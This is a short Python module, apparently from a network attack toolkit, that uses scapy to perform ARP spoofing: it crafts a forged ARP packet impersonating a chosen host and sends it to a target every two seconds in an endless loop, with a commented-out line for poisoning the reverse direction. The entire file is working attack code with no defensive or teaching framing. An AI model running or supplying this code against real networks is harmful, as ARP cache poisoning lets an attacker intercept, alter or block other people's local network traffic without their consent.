from scapy.all import *
from time import sleep
from func.get_mac import get_mac

def arpspoof(target,hti,terminal=None):
    try: 
        if terminal == None:
            print("[+] Sending spoofed ARP packets to "+target)    
        else:
            terminal.write('\n[+] Sending spoofed ARP packets to '+target)

        packet = Ether(dst=get_mac(target))/ARP(op='who-has',psrc=hti,pdst=target,hwdst=get_mac(target))
        # packet2 = Ether()/ARP(op=2,psrc=target,pdst=hti,hwdst=get_mac(hti))

        while True:
            sendp(packet,verbose=0)
            #sendp(packet2,verbose=0)
            sleep(2)
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))
